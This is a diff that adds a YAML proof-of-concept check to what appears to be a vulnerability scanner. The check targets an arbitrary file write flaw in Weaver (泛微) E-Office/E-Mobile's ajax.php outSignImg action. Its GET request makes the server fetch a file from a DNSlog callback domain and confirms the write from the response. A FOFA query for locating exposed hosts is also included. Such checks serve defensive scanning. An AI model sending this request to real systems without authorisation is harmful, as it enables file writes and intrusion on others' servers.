@@ -1,0 +1,23 @@
+id: poc-yaml-emobile-ajax-outsignImg-upload
+info:
+  name: 泛微E-Office ajax.php action=outSignImg 任意文件写入漏洞
+  severity: critical
+  tags:
+  - DNSLOG
+  - 文件写入
+  finger: 泛微-EMobile
+  fofa: app="泛微-EOffice"
+variables:
+  reverse: new_dns_log()
+  reverseDomain: reverse.Domain()
+requests:
+- method: GET
+  path: /E-mobile/App/Ajax/ajax.php?action=outSignImg&result[]=http://{{.reverseDomain}}/1.txt
+  expression: 'reverse.Verify() &&
+
+    !contains(body,"<") &&
+
+    matches(body,`outImgs\\/(\d+)\\/1.txt`)
+
+    '
+transport: http
